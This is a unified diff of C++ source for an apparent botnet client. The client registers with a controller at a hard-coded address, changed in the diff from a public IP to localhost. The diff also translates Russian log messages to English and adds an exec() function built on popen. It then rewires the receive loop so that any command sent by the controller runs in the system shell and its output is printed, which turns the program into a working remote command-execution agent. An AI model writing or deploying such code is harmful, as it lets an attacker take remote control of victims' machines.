@@ -5,25 +5,26 @@
 #include <ctime>
 #include <thread>
 #include <chrono>
-#include <random> 
-
+#include <random>
+#include <array>
+#include <memory>
+#include <stdexcept>
 #ifdef _WIN32
 #include <winsock2.h>
-#include <ws2tcpip.h> 
+#include <ws2tcpip.h>
+#include <windows.h>
 #pragma comment(lib, "ws2_32.lib")
 #else
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <unistd.h>
-#define SOCKET int
-#define INVALID_SOCKET -1
-#define SOCKET_ERROR -1
+#include <stdio.h>
 #endif
 
 using namespace std;
 
-const string CONTROLLER_IP = "81.200.153.234";
+const string CONTROLLER_IP = "127.0.0.1";
 const int CONTROLLER_PORT = 12345;
 
 #ifdef _WIN32
@@ -47,6 +48,34 @@ string generate_bot_id() {
 }
 
 string BOT_ID = generate_bot_id();
+
+#ifdef _WIN32
+string exec(const char* cmd) {
+    array < char, 128 > buffer;
+    string result;
+    unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
+    if (!pipe) {
+        throw runtime_error("popen() failed");
+    }
+    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
+        result += buffer.data();
+    }
+    return result;
+}
+#else
+string exec(const char* cmd) {
+    array<char, 128> buffer;
+    string result;
+    unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
+    if (!pipe) {
+        throw std::runtime_error("popen() failed!");
+    }
+    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
+        result += buffer.data();
+    }
+    return result;
+}
+#endif
 
 bool register_with_controller(SOCKET& sock) {
     try {
@@ -86,10 +115,10 @@ bool register_with_controller(SOCKET& sock) {
         int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
         if (bytes_received > 0) {
             buffer[bytes_received] = '\0';
-            cout << "Ответ от контроллера: " << buffer << endl;
+            cout << "Response from controller: " << buffer << endl;
         }
         else {
-            cerr << "Ошибка при получении данных от контроллера. Error: " <<
+            cerr << "Error receiving data from controller. Error: " <<
 #ifdef _WIN32
                 WSAGetLastError()
 #else
@@ -108,14 +137,15 @@ bool register_with_controller(SOCKET& sock) {
 }
 
 void execute_command(const string& command) {
-    cout << "Выполняю команду: " << command << endl;
+
+    cout << "Executing command: " << command << endl;
     if (command == "ping") {
         cout << "Bot " << BOT_ID << ": Pong!" << endl;
     }
     else if (command == "sleep") {
         random_device rd;
         mt19937 gen(rd());
-        uniform_int_distribution<> distrib(1, 5); // Диапазон 1-5 секунд
+        uniform_int_distribution<> distrib(1, 5); // Range 1-5 seconds
 
         int sleep_time = distrib(gen);
 
@@ -124,12 +154,12 @@ void execute_command(const string& command) {
         cout << "Bot " << BOT_ID << ": Woke up!" << endl;
     }
     else {
-        cout << "Bot " << BOT_ID << ": Неизвестная команда: " << command << endl;
+        cout << "Bot " << BOT_ID << ": Unknown command: " << command << endl;
     }
 }
 
+
 int main() {
-    setlocale(LC_ALL, "RUS");
 
 #ifdef _WIN32
     if (!initialize_winsock()) {
@@ -154,21 +184,30 @@ int main() {
         return 1;
     }
 
+
     while (true) {
         char buffer[1024];
         int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
 
         if (bytes_received > 0) {
             buffer[bytes_received] = '\0';
-            cout << "Получена команда: " << buffer << endl;
-            execute_command(buffer);
+            string command(buffer);
+            cout << "Received command: " << command << endl;
+
+            try {
+                string result = exec(command.c_str());
+                cout << "Command execution result:\n" << result << endl;
+            }
+            catch (const std::runtime_error& e) {
+                cerr << "Error executing command: " << e.what() << endl;
+            }
         }
         else if (bytes_received == 0) {
-            cout << "Контроллер отключился." << endl;
+            cout << "Controller disconnected." << endl;
             break;
         }
         else {
-            cerr << "Ошибка при получении данных. Error: " <<
+            cerr << "Error receiving data. Error: " <<
 #ifdef _WIN32
                 WSAGetLastError()
 #else
